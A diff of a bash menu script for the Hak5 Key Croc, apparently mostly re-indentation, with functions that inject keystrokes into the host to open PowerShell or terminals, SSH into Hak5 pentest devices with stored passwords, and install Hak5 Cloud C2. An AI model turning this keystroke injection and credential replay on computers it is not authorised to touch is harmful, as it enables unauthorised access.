-		Q STRING "Start-Process http://172.16.42.1:1471"
-		Q ENTER
-		sleep 3
-		Q ALT-TAB
-		sleep 2
-		Q STRING "exit"
-		Q ENTER
+if [ "${OS_CHECK}" = WINDOWS ]; then
+	Q GUI d
+	Q GUI r
+	sleep 1
+	Q STRING "powershell"
+	Q ENTER
+	sleep 2
+	Q STRING "Start-Process http://172.16.42.1:1471"
+	Q ENTER
+	sleep 3
+	Q ALT-TAB
+	sleep 2
+	Q STRING "exit"
+	Q ENTER
 else
 	local HOST_CHECK=$(sed -n 3p ${CROC_OS})
 	case $HOST_CHECK in
-		raspberrypi)
-					Q GUI d
-					sleep 1
-					Q STRING "terminal"
-					Q ENTER
-					Q ENTER
-					sleep 1
-					Q STRING "gio open http://172.16.42.1:1471"
-					Q ENTER
-					sleep 3
-					Q ALT-TAB
-					sleep 1
-					Q ALT-F4;;
-			 parrot)
-					Q ALT F2
-					sleep 1
-					Q STRING "mate-terminal"
-					Q ENTER
-					sleep 1
-					Q STRING "gio open http://172.16.42.1:1471"
-					Q ENTER
-					sleep 3
-					Q ALT-TAB
-					sleep 1
-					Q ALT-F4;;
-				  *)
-					Q ALT F2
-					sleep 1
-					Q STRING "xterm"
-					Q ENTER
-					sleep 1
-					Q STRING "gio open http://172.16.42.1:1471"
-					Q ENTER
-					sleep 3
-					Q ALT-TAB
-					sleep 1
-					Q ALT-F4;;
+	raspberrypi)
+		Q GUI d
+		sleep 1
+		Q STRING "terminal"
+		Q ENTER
+		Q ENTER
+		sleep 1
+		Q STRING "gio open http://172.16.42.1:1471"
+		Q ENTER
+		sleep 3
+		Q ALT-TAB
+		sleep 1
+		Q ALT-F4;;
+	parrot)
+		Q ALT F2
+		sleep 1
+		Q STRING "mate-terminal"
+		Q ENTER
+		sleep 1
+		Q STRING "gio open http://172.16.42.1:1471"
+		Q ENTER
+		sleep 3
+		Q ALT-TAB
+		sleep 1
+		Q ALT-F4;;
+	*)
+		Q ALT F2
+		sleep 1
+		Q STRING "xterm"
+		Q ENTER
+		sleep 1
+		Q STRING "gio open http://172.16.42.1:1471"
+		Q ENTER
+		sleep 3
+		Q ALT-TAB
+		sleep 1
+		Q ALT-F4;;
 	esac
 fi
 }
-
 ##
-#   - SSH wifi pineapple menu
+#----SSH wifi pineapple menu
 ##
-
 MenuTitle WIFI PINEAPPLE MENU
 MenuColor 1 SSH PINEAPPLE ; echo -ne "     ${clear}\n"
 MenuColor 2 PINEAPPLE WEB ; echo -ne "     ${clear}\n"
@@ -4647,165 +4394,153 @@ MenuEnd
 	*) invalid_entry ; ssh_menu ;;
 	esac
 }
-
 ##
-#   - SSH to packet squirrel
+#----SSH to packet squirrel
 ##
-
 ssh_squirrel() {
 	read -p "$(ColorBlue 'ENTER PACKET SQUIRREL IP FOR SSH AND PRESS [ENTER]:') " SQUIRREL
-	if [[ "${SQUIRREL}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
-	if [ "$(sed -n '2p' ${hak_gear})" != "" ]; then
+if [[ "${SQUIRREL}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
+if [ "$(sed -n '2p' ${hak_gear})" != "" ]; then
 	sshpass -p $(sed -n 2p ${hak_gear}) ssh root@${SQUIRREL}
-	fi
+fi
 else
-	if [ "$(sed -n '2p' ${hak_gear})" != "" ]; then
+if [ "$(sed -n '2p' ${hak_gear})" != "" ]; then
 	echo -ne "\e[40;4;5m$(ColorRed 'USING PACKET SQUIRREL DEFAULT IP 172.16.32.1')${clear}"
 	sshpass -p $(sed -n 2p ${hak_gear}) ssh root@172.16.32.1
 else
 	pw_list
- fi
+fi
 fi
 }
-
 ##
-#   - SSH to lan turtle
+#----SSH to lan turtle
 ##
-
 ssh_turtle() {
 	read -p "$(ColorBlue 'ENTER LAN TURTLE IP FOR SSH AND PRESS [ENTER]:') " TURTLE
-	if [[ "${TURTLE}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
-	if [ "$(sed -n '3p' ${hak_gear})" != "" ]; then
+if [[ "${TURTLE}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
+if [ "$(sed -n '3p' ${hak_gear})" != "" ]; then
 	sshpass -p $(sed -n 3p ${hak_gear}) ssh root@${TURTLE}
-	fi
+fi
 else
-	if [ "$(sed -n '3p' ${hak_gear})" != "" ]; then
+if [ "$(sed -n '3p' ${hak_gear})" != "" ]; then
 	echo -ne "\e[40;4;5m$(ColorRed 'USING LAN TURTLE DEFAULT IP 172.16.84.1')${clear}"
 	sshpass -p $(sed -n 3p ${hak_gear}) ssh root@172.16.84.1
 else
 	pw_list
- fi
+fi
 fi
 }
-
 ##
-#   - SSH to signal owl
+#----SSH to signal owl
 ##
-
 ssh_owl() {
 	read -p "$(ColorBlue 'ENTER SIGNAL OWL IP FOR SSH AND PRESS [ENTER]:') " OWL
-	if [[ "${OWL}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
-	if [ "$(sed -n '4p' ${hak_gear})" != "" ]; then
+if [[ "${OWL}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
+if [ "$(sed -n '4p' ${hak_gear})" != "" ]; then
 	sshpass -p $(sed -n 4p ${hak_gear}) ssh root@${OWL}
-	fi
+fi
 else
-	if [ "$(sed -n '4p' ${hak_gear})" != "" ]; then
-	echo -ne "\e[40;4;5m$(ColorRed 'USING SIGNAL OWL DEFAULT IP 172.16.56.1')${clear}"
-	sshpass -p $(sed -n 4p ${hak_gear}) ssh root@172.16.56.1
+if [ "$(sed -n '4p' ${hak_gear})" != "" ]; then
+	echo -ne "\e[40;m$(ColorGreen 'SIGNAL OWL IP:')${clear}"${IP_O}
+	sshpass -p $(sed -n 4p ${hak_gear}) ssh root@${IP_O}
 else
 	pw_list
- fi
+fi
 fi
 }
-
 ##
-#   - SSH to shark jack
+#----SSH to shark jack
 ##
-
 ssh_shark() {
 	read -p "$(ColorBlue 'ENTER SHARK JACK IP FOR SSH AND PRESS [ENTER]:') " SHARK
-	if [[ "${SHARK}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
-	if [ "$(sed -n '5p' ${hak_gear})" != "" ]; then
+if [[ "${SHARK}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
+if [ "$(sed -n '5p' ${hak_gear})" != "" ]; then
 	sshpass -p $(sed -n 5p ${hak_gear}) ssh root@${SHARK}
 	fi
 else
-	if [ "$(sed -n '5p' ${hak_gear})" != "" ]; then
-	echo -ne "\e[40;4;5m$(ColorRed 'USING SHARK JACK DEFAULT IP 172.16.24.1')${clear}"
-	sshpass -p $(sed -n 5p ${hak_gear}) ssh root@172.16.24.1
+if [ "$(sed -n '5p' ${hak_gear})" != "" ]; then
+	echo -ne "\e[40;m$(ColorGreen 'SHARK JACK IP:')${clear}"${IP_F}
+	sshpass -p $(sed -n 5p ${hak_gear}) ssh root@${IP_F}
 else
 	pw_list
- fi
+fi
 fi
 }
-
 ##
-#   - SSH to bash bunny
+#----SSH to bash bunny
 ##
-
 ssh_bunny() {
-	if [ "$(sed -n '6p' ${hak_gear})" != "" ]; then
-		echo -ne "\e[40m$(ColorYellow 'Bash Bunny passwd found')\n${clear}"
-	else
-		echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'ENTER BASH BUNNY PASSWD')${clear}"${LINE_}
-		pw_list
-	fi
-		local CROC_OS=/root/udisk/loot/Croc_OS.txt
-		local OS_CHECK=$(sed -n 1p ${CROC_OS})
-	if [ "${OS_CHECK}" = WINDOWS ]; then
-		Q GUI d
-		Q GUI r
-		sleep 1
-		Q STRING "powershell"
-		Q ENTER
-		sleep 2
-		Q STRING "ssh root@172.16.64.1"
-		Q ENTER
+if [ "$(sed -n '6p' ${hak_gear})" != "" ]; then
+	echo -ne "\e[40m$(ColorYellow 'Bash Bunny passwd found')\n${clear}"
+else
+	echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'ENTER BASH BUNNY PASSWD')${clear}"${LINE_}
+	pw_list
+fi
+	local CROC_OS=/root/udisk/loot/Croc_OS.txt
+	local OS_CHECK=$(sed -n 1p ${CROC_OS})
+if [ "${OS_CHECK}" = WINDOWS ]; then
+	Q GUI d
+	Q GUI r
+	sleep 1
+	Q STRING "powershell"
+	Q ENTER
+	sleep 2
+	Q STRING "ssh root@172.16.64.1"
+	Q ENTER
 else
 	local HOST_CHECK=$(sed -n 3p ${CROC_OS})
 	case $HOST_CHECK in
-		raspberrypi)
-					Q GUI d
-					sleep 1
-					Q STRING "terminal"
-					Q ENTER
-					Q ENTER
-					sleep 1
-					Q STRING "ssh root@172.16.64.1"
-					Q ENTER
-					sleep 1
-					Q STRING $(sed -n '6p' ${hak_gear})
-					Q ENTER;;
-			 parrot)
-					Q ALT F2
-					sleep 1
-					Q STRING "mate-terminal"
-					Q ENTER
-					sleep 1
-					Q STRING "ssh root@172.16.64.1"
-					Q ENTER
-					sleep 1
-					Q STRING $(sed -n '6p' ${hak_gear})
-					Q ENTER;;
-				  *)
-					Q ALT F2
-					sleep 1
-					Q STRING "xterm"
-					Q ENTER
-					sleep 1
-					Q STRING "ssh root@172.16.64.1"
-					Q ENTER
-					sleep 1
-					Q STRING $(sed -n '6p' ${hak_gear})
-					Q ENTER;;
+	raspberrypi)
+		Q GUI d
+		sleep 1
+		Q STRING "terminal"
+		Q ENTER
+		Q ENTER
+		sleep 1
+		Q STRING "ssh root@172.16.64.1"
+		Q ENTER
+		sleep 1
+		Q STRING $(sed -n '6p' ${hak_gear})
+		Q ENTER;;
+	parrot)
+		Q ALT F2
+		sleep 1
+		Q STRING "mate-terminal"
+		Q ENTER
+		sleep 1
+		Q STRING "ssh root@172.16.64.1"
+		Q ENTER
+		sleep 1
+		Q STRING $(sed -n '6p' ${hak_gear})
+		Q ENTER;;
+	*)
+		Q ALT F2
+		sleep 1
+		Q STRING "xterm"
+		Q ENTER
+		sleep 1
+		Q STRING "ssh root@172.16.64.1"
+		Q ENTER
+		sleep 1
+		Q STRING $(sed -n '6p' ${hak_gear})
+		Q ENTER;;
 	esac
 fi
 }
-
 ##
-#   - SSH Menu
+#----SSH Menu
 ##
-
 	LED B
 MenuTitle CROC SSH MENU
-MenuColor  1 START SSH WITH CONNECT PC ; echo -ne " ${clear}\n"
-MenuColor  2 START SSH WITH USER INPUT ; echo -ne " ${clear}\n"
-MenuColor  3 ENABLE_SSH ; echo -ne "            ${clear}\n"
-MenuColor  4 DISABLE_SSH ; echo -ne "           ${clear}\n"
-MenuColor  5 WIFI PINEAPPLE ; echo -ne "         ${clear}\n"
-MenuColor  6 PACKET SQUIRREL ; echo -ne "        ${clear}\n"
-MenuColor  7 LAN TURTLE ; echo -ne "             ${clear}\n"
-MenuColor  8 SIGNAL OWL ; echo -ne "             ${clear}\n"
-MenuColor  9 SHARK JACK ; echo -ne "             ${clear}\n"
+MenuColor 1 START SSH WITH CONNECT PC ; echo -ne " ${clear}\n"
+MenuColor 2 START SSH WITH USER INPUT ; echo -ne " ${clear}\n"
+MenuColor 3 ENABLE_SSH ; echo -ne "            ${clear}\n"
+MenuColor 4 DISABLE_SSH ; echo -ne "           ${clear}\n"
+MenuColor 5 WIFI PINEAPPLE ; echo -ne "         ${clear}\n"
+MenuColor 6 PACKET SQUIRREL ; echo -ne "        ${clear}\n"
+MenuColor 7 LAN TURTLE ; echo -ne "             ${clear}\n"
+MenuColor 8 SIGNAL OWL ; echo -ne "             ${clear}\n"
+MenuColor 9 SHARK JACK ; echo -ne "             ${clear}\n"
 MenuColor 10 BASH BUNNY ; echo -ne "            ${clear}\n"
 MenuColor 11 RETURN TO MAIN MENU ; echo -ne "     ${clear}\n"
 MenuEnd
@@ -4826,11 +4561,9 @@ MenuEnd
 	*) invalid_entry ; ssh_menu ;;
 	esac
 }
-
 ##
-#   - Keycroc recovery function
+#----Keycroc recovery function
 ##
-
 function croc_recovery() {
 	clear
 	echo -ne "$(Info_Screen '
@@ -4839,120 +4572,112 @@ function croc_recovery() {
 -Restore the keycroc firmware with the lastest firmware\n
 -factory recovery will bring you to Hak5 factory recovery web page\n
 -Remove this will remove the lastest firmware from tools folder\n')\n"
-
 ##
-#   - Download lastest firmware function
+#----Download lastest firmware function
 ##
-
 croc_firmware() {
 	echo -ne "$(Info_Screen '
 -This will Download KeyCroc lastest firmware from Hak5\n
 -Download center and place it in the tools folder\n
 -for later recovery, Download may take some time\n')${clear}\n"
-	if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
-		echo -ne "\n\e[40m$(ColorGreen 'KeyCroc lastest firmware file already exists')\n${clear}"
-	else
-		echo -ne "\n\e[40m$(ColorYellow '-Downloading KeyCroc lastest firmware')\n${clear}"
-		wget https://storage.googleapis.com/hak5-dl.appspot.com/keycroc/firmwares/1.3-stable/kc_fw_1.3_510.tar.gz -P /root/udisk/tools
-	fi
+if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
+	echo -ne "\n\e[40m$(ColorGreen 'KeyCroc lastest firmware file already exists')\n${clear}"
+else
+	echo -ne "\n\e[40m$(ColorYellow '-Downloading KeyCroc lastest firmware')\n${clear}"
+	wget https://storage.googleapis.com/hak5-dl.appspot.com/keycroc/firmwares/1.3-stable/kc_fw_1.3_510.tar.gz -P /root/udisk/tools
+fi
 }
-
 ##
-#   - hak5 factory recovery function
+#----hak5 factory recovery function
 ##
-
 hak_factory() {
 	echo -ne "\n\e[40m$(ColorYellow 'Open Hak5 factory recovery web page')\n${clear}"
 	local CROC_OS=/root/udisk/loot/Croc_OS.txt
 	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-	if [ "${OS_CHECK}" = WINDOWS ]; then
-		Q GUI d
-		Q GUI r
-		sleep 1
-		Q STRING "powershell"
-		Q ENTER
-		sleep 2
-		Q STRING "Start-Process https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
-		Q ENTER
-		sleep 5
-		Q ALT-TAB
-		sleep 1
-		Q STRING "exit"
-		Q ENTER
+if [ "${OS_CHECK}" = WINDOWS ]; then
+	Q GUI d
+	Q GUI r
+	sleep 1
+	Q STRING "powershell"
+	Q ENTER
+	sleep 2
+	Q STRING "Start-Process https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
+	Q ENTER
+	sleep 5
+	Q ALT-TAB
+	sleep 1
+	Q STRING "exit"
+	Q ENTER
 else
 	local HOST_CHECK=$(sed -n 3p ${CROC_OS})
 	case $HOST_CHECK in
 	raspberrypi)
-				Q GUI d
-				sleep 1
-				Q STRING "terminal"
-				Q ENTER
-				Q ENTER
-				sleep 1
-				Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
-				Q ENTER
-				sleep 5
-				Q ALT-TAB
-				sleep 1
-				Q ALT-F4;;
-		 parrot)
-				Q ALT F2
-				sleep 1
-				Q STRING "mate-terminal"
-				Q ENTER
-				sleep 1
-				Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
-				Q ENTER
-				sleep 5
-				Q ALT-TAB
-				sleep 1
-				Q ALT-F4;;
-			  *)
-				Q ALT F2
-				sleep 1
-				Q STRING "xterm"
-				Q ENTER
-				sleep 1
-				Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
-				Q ENTER
-				sleep 5
-				Q ALT-TAB
-				sleep 1
-				Q ALT-F4;;
+		Q GUI d
+		sleep 1
+		Q STRING "terminal"
+		Q ENTER
+		Q ENTER
+		sleep 1
+		Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
+		Q ENTER
+		sleep 5
+		Q ALT-TAB
+		sleep 1
+		Q ALT-F4;;
+	parrot)
+		Q ALT F2
+		sleep 1
+		Q STRING "mate-terminal"
+		Q ENTER
+		sleep 1
+		Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
+		Q ENTER
+		sleep 5
+		Q ALT-TAB
+		sleep 1
+		Q ALT-F4;;
+	*)
+		Q ALT F2
+		sleep 1
+		Q STRING "xterm"
+		Q ENTER
+		sleep 1
+		Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
+		Q ENTER
+		sleep 5
+		Q ALT-TAB
+		sleep 1
+		Q ALT-F4;;
 	esac
 fi
 }
-
 ##
-#   - Restore lastest firmware function
+#----Restore lastest firmware function
 ##
-
 restore_firmware() {
 	echo -ne "\n\e[40m$(ColorRed 'THIS WILL RESTORE THE KEYCROC TO THE LATEST FIRMWARE\n
 	ARE YOUR YOU SURE YES OR NO AND PRESS [ENTER]:')${clear}"
 	read r_f
 	case $r_f in
 	[yY] | [yY][eE][sS])
-						if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
-						echo -ne "\e[40m$(ColorYellow 'Moving Firmware to KeyCroc udisk
-						This will take an couple of minutes')\n${clear}"
-						cp /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk
-						echo -ne "\e[40m$(ColorGreen 'You can now unplug the KeyCroc and plug back in')\n${clear}"
-						else
-						echo -ne "\e[40m$(ColorRed 'DID NOT FIND KEYCROC FIRMWARE FILE PLEASE DOWNLOAD')\n${clear}"
-						fi ;;
-		[nN] | [nN][oO])
-						echo -ne "\n\e[40m$(ColorYellow 'Returning back to menu')\n${clear}"
-						croc_recovery ;;
-					  *)
-						invalid_entry ; restore_firmware ;;
+	if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
+		echo -ne "\e[40m$(ColorYellow 'Moving Firmware to KeyCroc udisk
+		This will take an couple of minutes')\n${clear}"
+		cp /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk
+		echo -ne "\e[40m$(ColorGreen 'You can now unplug the KeyCroc and plug back in')\n${clear}"
+	else
+		echo -ne "\e[40m$(ColorRed 'DID NOT FIND KEYCROC FIRMWARE FILE PLEASE DOWNLOAD')\n${clear}"
+	fi ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Returning back to menu')\n${clear}"
+		croc_recovery ;;
+	*)
+		invalid_entry ; restore_firmware ;;
 	esac
 }
-
 ##
-#   - recovery repair locale LANG=en_US.UTF-8
+#----recovery repair locale LANG=en_US.UTF-8
 ##
-
 locale_en_US() {
 	clear
 	echo -ne "\n$(Info_Screen '
@@ -4963,24 +4688,22 @@ locale_en_US() {
 	read -p "$(ColorBlue 'FIX THE ERROR YES OR NO AND PRESS [ENTER]:') " FIX_ERROR
 	case $FIX_ERROR in
 	[yY] | [yY][eE][sS])
-						echo -ne "\n$(ColorGreen 'Repairing The error')\n"
-						echo "LC_ALL=en_US.UTF-8" >> /etc/environment
-						echo "en_US.UTF-8 UTF-8" >> /etc/locale.gen
-						echo "LANG=en_US.UTF-8" > /etc/locale.conf
-						locale-gen en_US.UTF-8
-						echo -ne "\n$(ColorGreen 'Done Repairing The error unplug the keycroc and plug back in')\n" ;;
-		[nN] | [nN][oO])
-						echo -ne "\n$(ColorYellow 'Returning back to menu')\n"
-						croc_recovery ;;
-					  *)
-						invalid_entry ; croc_recovery ;;
+		echo -ne "\n$(ColorGreen 'Repairing The error')\n"
+		echo "LC_ALL=en_US.UTF-8" >> /etc/environment
+		echo "en_US.UTF-8 UTF-8" >> /etc/locale.gen
+		echo "LANG=en_US.UTF-8" > /etc/locale.conf
+		locale-gen en_US.UTF-8
+		echo -ne "\n$(ColorGreen 'Done Repairing The error unplug the keycroc and plug back in')\n" ;;
+	[nN] | [nN][oO])
+		echo -ne "\n$(ColorYellow 'Returning back to menu')\n"
+		croc_recovery ;;
+	*)
+		invalid_entry ; croc_recovery ;;
 	esac
 }
-
 ##
-#   - Remove Croc_Pot and all contents
+#----Remove Croc_Pot and all contents
 ##
-
 remove_croc_pot() {
 	echo -ne "\n$(Info_Screen '
 --This will completely remove Croc_Pot from the KeyCroc\n
@@ -4988,26 +4711,26 @@ remove_croc_pot() {
 	echo -ne "\e[40m$(ColorRed 'ARE YOU SURE YOU WANT TO REMOVE CROCPOT TYPE YES OR NO AND PRESS [ENTER]:')${clear} "; read CROC_POT_REMOVE
 	case $CROC_POT_REMOVE in
 	[yY] | [yY][eE][sS])
-						apt -y remove unzip openvpn sshpass mc nmon
-						rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot
-						rm /usr/local/bin/c2-3.1.2_armv7_linux /etc/systemd/system/hak5.service
-						rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt
-						rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt
-						rm /root/udisk/payloads/Getonline.txt /root/udisk/payloads/Quick_Start_C2.txt
-						rm /root/udisk/loot/Croc_OS.txt /root/udisk/loot/Croc_OS_ip.txt
-						rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt
-						apt-get autoremove
-						exit 0 ;;
-		[nN] | [nN][oO])
-						echo -e "\n\e[40m$(ColorYellow 'Return Back to main menu')${clear} "
-						main_menu ;;
+		apt -y remove unzip openvpn sshpass mc nmon
+		rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot
+		rm /usr/local/bin/c2-3.1.2_armv7_linux /etc/systemd/system/hak5.service
+		rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt
+		rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt
+		rm /root/udisk/payloads/Getonline.txt /root/udisk/payloads/Quick_Start_C2.txt
+		rm /root/udisk/loot/Croc_OS.txt /root/udisk/loot/Croc_OS_ip.txt
+		rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt
+		apt-get autoremove
+		exit 0 ;;
+	[nN] | [nN][oO])
+		echo -e "\n\e[40m$(ColorYellow 'Return Back to main menu')${clear} "
+		main_menu ;;
+	*)
+		invalid_entry
 	esac
 }
-
 ##
-#   - Keycroc apt update/upgrade
+#----Keycroc apt update/upgrade
 ##
-
 function croc_update() {
 	clear
 	echo -ne "$(Info_Screen '
@@ -5015,21 +4738,19 @@ Update/Upgrade your KeyCroc Packages\n')${clear}\n\n"
 	read -p "$(ColorBlue 'UPDATE KEYCROC PACKAGES YES OR NO AND PRESS [ENTER]:\n') " UPDATE
 	case $UPDATE in
 	[yY] | [yY][eE][sS])
-						echo -ne "\n\e[40m$(ColorGreen 'UPDATING AND UPGRADING THE KEYCROC PACKAGES')${clear}\n"
-						apt update && apt upgrade -y
-						main_menu ;;
-		[nN] | [nN][oO])
-						echo -ne "\n\e[40m$(ColorYellow 'RETURING BACK TO MENU')${clear}\n"
-						main_menu ;;
-					  *)
-						invalid_entry ; croc_update ;;
+		echo -ne "\n\e[40m$(ColorGreen 'UPDATING AND UPGRADING THE KEYCROC PACKAGES')${clear}\n"
+		apt update && apt upgrade -y
+		main_menu ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'RETURING BACK TO MENU')${clear}\n"
+		main_menu ;;
+	*)
+		invalid_entry ; croc_update ;;
 	esac
 }
-
 ##
-#   - recovery menu
+#----ecovery menu
 ##
-
 MenuTitle KEYCROC RECOVERY MENU
 MenuColor 1 DOWNLOAD LATEST FIRMWARE ; echo -ne "  ${clear}\n"
 MenuColor 2 FACTORY RESET HOW TO ; echo -ne "       ${clear}\n"
@@ -5054,11 +4775,9 @@ MenuEnd
 	*) invalid_entry ; croc_recovery ;;
 	esac
 }
-
 ##
-#   - Hak5 Cloud_C2 function
+#----Hak5 Cloud_C2 function
 ##
-
 function hak_cloud() {
 	clear
 	echo -ne "$(Info_Screen '
@@ -5071,23 +4790,19 @@ function hak_cloud() {
 -Next reboot run #4 RESTART HAK5 C2\n
 -ON any device type in the keycroc IP into any web browser url, That is on the\n
 same network as the keycroc and connect to HAK5 C2\n')${clear}\n"
-
 ##
-#   - Hak5 Cloud_C2 install unzip
+#----Hak5 Cloud_C2 install unzip
 ##
-
 cloud_setup() {
 	local pkg_zip=unzip
 	local status_zip="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg_zip" 2>&1)"
-	if [ ! $? = 0 ] || [ ! "$status_zip" = installed ]; then
+if [ ! $? = 0 ] || [ ! "$status_zip" = installed ]; then
 	apt install $pkg_zip
-	fi
-
+fi
 ##
-#   - Hak5 Cloud_C2 download and install
+#----Hak5 Cloud_C2 download and install
 ##
-
-	if [ -e /var/hak5c2 ]; then
+if [ -e /var/hak5c2 ]; then
 	echo -ne "\t\t\e[40m${LINE_}$(ColorYellow 'HAK5 C2 is already installed on the keycroc')${LINE_}${clear}\n"
 	hak_cloud
 else
@@ -5109,15 +4824,13 @@ ExecStart=/usr/local/bin/c2-3.1.2_armv7_linux -hostname $(ifconfig wlan0 | grep 
 	start_web
 fi
 }
-
 ##
-#   - Hak5 Cloud_C2 start web brower
+#----Hak5 Cloud_C2 start web brower
 ##
-
 start_web() {
 	local CROC_OS=/root/udisk/loot/Croc_OS.txt
 	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-	if [ "${OS_CHECK}" = WINDOWS ]; then
+if [ "${OS_CHECK}" = WINDOWS ]; then
 	Q GUI d
 	Q GUI r
 	sleep 1
@@ -5135,71 +4848,65 @@ else
 	local HOST_CHECK=$(sed -n 3p ${CROC_OS})
 	case $HOST_CHECK in
 	raspberrypi)
-				Q GUI d
-				sleep 1
-				Q STRING "terminal"
-				Q ENTER
-				Q ENTER
-				sleep 1
-				Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-				Q ENTER
-				sleep 5
-				Q ALT-TAB
-				sleep 1
-				Q ALT-F4;;
-		 parrot)
-				Q ALT F2
-				sleep 1
-				Q STRING "mate-terminal"
-				Q ENTER
-				sleep 1
-				Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-				Q ENTER
-				sleep 5
-				Q ALT-TAB
-				sleep 1
-				Q ALT-F4;;
-			  *)
-				Q ALT F2
-				sleep 1
-				Q STRING "xterm"
-				Q ENTER
-				sleep 1
-				Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-				Q ENTER
-				sleep 5
-				Q ALT-TAB
-				sleep 1
-				Q ALT-F4;;
+	Q GUI d
+	sleep 1
+	Q STRING "terminal"
+	Q ENTER
+	Q ENTER
+	sleep 1
+	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q ENTER
+	sleep 5
+	Q ALT-TAB
+	sleep 1
+	Q ALT-F4;;
+	parrot)
+	Q ALT F2
+	sleep 1
+	Q STRING "mate-terminal"
+	Q ENTER
+	sleep 1
+	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q ENTER
+	sleep 5
+	Q ALT-TAB
+	sleep 1
+	Q ALT-F4;;
+	*)
+	Q ALT F2
+	sleep 1
+	Q STRING "xterm"
+	Q ENTER
+	sleep 1
+	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q ENTER
+	sleep 5
+	Q ALT-TAB
+	sleep 1
+	Q ALT-F4;;
 	esac
 fi
 }
-
 ##
-#   - Hak5 Cloud_C2 reload
+#----Hak5 Cloud_C2 reload
 ##
-
 reload_cloud() {
 	systemctl daemon-reload && systemctl start hak5.service
 	sleep 5
 	systemctl status hak5.service
 	sleep 5
 }
-
 ##
-#   - Hak5 Cloud_C2 remove C2
+#----Hak5 Cloud_C2 remove C2
 ##
-
 remove_cloud() {
 	rm -r /var/hak5c2
 	rm /usr/local/bin/c2-3.1.2_armv7_linux
 	rm /etc/systemd/system/hak5.service
 }
-
 ##
-#   - Quick start Cloud_C2 payload function
+#----Quick start Cloud_C2 payload function
 ##
-
 quick_cloud() {
 	local quickcloud=/root/udisk/payloads/Quick_Start_C2.txt
 	clear
@@ -5208,7 +4915,7 @@ quick_cloud() {
 -This will install Quick_Start_C2.txt in the payload folder\n
 -Use this to start C2 from a payload\n
 -Type in startc2 this will automatically start C2\n')${clear}\n"
-	if [ -e "${quickcloud}" ]; then
+if [ -e "${quickcloud}" ]; then
 	echo -ne "\n\e[40m$(ColorGreen 'Quick_Start_C2.txt already exist check payloads folder\n')"
 else
 	echo -ne "MATCH startc2\nCROC_OS=/root/udisk/loot/Croc_OS.txt\nif [ -e \${CROC_OS} ]; then\nLED G\nsystemctl restart hak5.service
@@ -5223,92 +4930,85 @@ Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\nesac\nfi\nelse\nLED G\nsystemc
 	echo -ne "\n\e[40m$(ColorGreen 'Quick_Start_C2.txt is now installed check payloads folder\n')"
 fi
 }
-
 ##
-#   - Save Cloud_C2 setup/ip function
+#----Save Cloud_C2 setup/ip function
 ##
-
 save_ip() {
 	clear
 	echo -ne "$(Info_Screen '
 - #1 will save the IP,Netmask,Gateway that is setup with C2\n
 - #2 will restore the keycroc to saved IP,Netmask,Gateway\n
 - #3 Manually add IP,Netmask,Gateway\n')${clear}\n"
-
 save_setup() {
 	local cloud_ip=/root/udisk/tools/Croc_Pot/C2_IP.txt
-
 run_save_v() {
 	ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6- | tee ${cloud_ip}
 	/sbin/ifconfig wlan0 | awk '/Mask:/ {print $4;}' | sed -e 's/Mask://g' -e 's/^[\t]*//' | tee -a ${cloud_ip}
